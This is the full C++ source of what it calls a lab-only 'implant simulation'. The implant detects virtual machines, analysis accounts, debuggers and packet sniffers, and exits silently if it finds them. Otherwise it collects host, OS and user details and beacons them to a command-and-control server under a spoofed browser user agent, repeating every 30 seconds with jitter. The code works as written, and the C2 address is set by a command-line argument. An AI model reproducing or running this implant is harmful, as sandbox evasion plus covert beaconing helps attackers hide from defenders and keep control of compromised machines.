// stage2.cpp — Implant simulation (LAB ONLY, isolated network)
// Build: g++ -O2 -std=c++17 stage2.cpp -o stage2 -lcurl
#include <curl/curl.h>
#include <fstream>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <random>
#include <sstream>
#include <cstring>
#include <unistd.h>
#include <sys/utsname.h>

// ---------- Anti-analysis / sandbox detection ----------

bool detect_sandbox() {
    // 1) VM artifacts in DMI
    std::ifstream dmi("/sys/class/dmi/id/product_name");
    std::string line;
    if (dmi.is_open()) {
        std::getline(dmi, line);
        for (const char* sig : {"VirtualBox", "VMware", "KVM", "QEMU", "Xen", "Bochs"}) {
            if (line.find(sig) != std::string::npos) return true;
        }
    }
    // 2) known analysis accounts
    if (getenv("USER") && (strstr(getenv("USER"), "sandbox") ||
                           strstr(getenv("USER"), "malware") ||
                           strstr(getenv("USER"), "analysis"))) return true;
    // 3) running analysis tools
    FILE* p = popen("ps -eo comm 2>/dev/null", "r");
    if (p) {
        char buf[128];
        while (fgets(buf, sizeof(buf), p)) {
            for (const char* t : {"gdb", "wireshark", "tcpdump", "strace", "ltrace", "ida", "ghidra"})
                if (strstr(buf, t)) { pclose(p); return true; }
        }
        pclose(p);
    }
    return false;
}

// Timing check: sandboxes/debuggers often accelerate Sleep()
bool timing_check() {
    auto start = std::chrono::steady_clock::now();
    std::this_thread::sleep_for(std::chrono::seconds(2));
    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                       std::chrono::steady_clock::now() - start).count();
    return elapsed < 1;
}

// ---------- System info collection ----------

std::string collect_sysinfo() {
    struct utsname u;
    std::ostringstream ss;
    if (uname(&u) == 0) {
        ss << "{\"os\":\"" << u.sysname << " " << u.release << "\","
           << "\"arch\":\"" << u.machine << "\","
           << "\"host\":\"" << u.nodename << "\","
           << "\"user\":\"" << (getenv("USER") ? getenv("USER") : "unknown") << "\"}";
    }
    return ss.str();
}

// ---------- C2 communication ----------

static size_t write_cb(void* p, size_t s, size_t n, void* ud) {
    static_cast<std::string*>(ud)->append((char*)p, s * n);
    return s * n;
}

bool beacon(const std::string& c2, const std::string& sysinfo,
            const std::string& campaign_id, std::string& response) {
    CURL* c = curl_easy_init();
    if (!c) return false;

    std::string url = c2 + "/gate?cid=" + campaign_id;
    curl_easy_setopt(c, CURLOPT_URL, url.c_str());
    curl_easy_setopt(c, CURLOPT_POSTFIELDS, sysinfo.c_str());
    curl_easy_setopt(c, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0) Chrome/124.0");
    curl_easy_setopt(c, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(c, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(c, CURLOPT_TIMEOUT, 10L);
    CURLcode rc = curl_easy_perform(c);
    curl_easy_cleanup(c);
    return rc == CURLE_OK;
}

int main(int argc, char** argv) {
    curl_global_init(CURL_GLOBAL_DEFAULT);

    // Inside a Docker container: http://c2-listener:9090 — from host: http://localhost:9090
    std::string c2 = (argc > 1) ? argv[1] : "http://localhost:9090";

    if (detect_sandbox()) {
        std::cout << "[-] analysis environment detected. exiting silently.\n";
        return 0;
    }
    if (timing_check()) {
        std::cout << "[-] timing anomaly detected. exiting.\n";
        return 0;
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dist(1000, 9999);
    std::string cid = std::to_string(dist(gen));

    std::string sysinfo = collect_sysinfo();
    std::cout << "[*] implant active. sysinfo: " << sysinfo << "\n";

    // Beacon loop — every 30s + jitter
    while (true) {
        std::string resp;
        if (beacon(c2, sysinfo, cid, resp)) {
            std::cout << "[+] beacon sent (cid=" << cid << ") C2 said: "
                      << (resp.empty() ? "<empty>" : resp) << "\n";
            if (resp.find("exit") != std::string::npos) {
                std::cout << "[*] received exit command. terminating.\n";
                break;
            }
        } else {
            std::cout << "[-] C2 unreachable, retrying...\n";
        }
        int jitter = dist(gen) % 10;
        std::this_thread::sleep_for(std::chrono::seconds(30 + jitter));
    }
    return 0;
}